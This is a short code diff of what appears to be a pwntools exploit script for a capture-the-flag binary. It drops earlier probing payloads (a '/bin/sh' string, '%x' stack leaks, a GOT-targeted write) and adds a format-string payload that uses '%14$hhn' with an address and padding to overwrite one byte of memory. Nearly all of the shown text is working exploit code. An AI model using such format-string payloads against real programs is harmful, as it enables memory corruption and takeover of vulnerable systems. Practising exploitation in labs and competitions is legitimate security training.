@@ -71,14 +71,9 @@ def main():
     print(exe.plt)
     cycle_input(r, payload)
 
-    payload_2 = b'/bin/sh'
-    payload = b'a'*2 + b'%4$x %'
-    payload = b'a'*2 + b'%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x '
     # write at %15 offset (buffer starts there)
     # target = 0x0804A2A0
-    payload = '2044%16$hn39580%15$hx'
-    strlen_got = exe.got.strlen
-    print("strlen_got = " + str(strlen_got))
+    payload = p32(0x08048f0f, endianness = 'little') + b'a'*96 + b'%14$hhn' #write 1 byte into n
     r.sendline(payload)
     data = r.recvline()
     print(data)
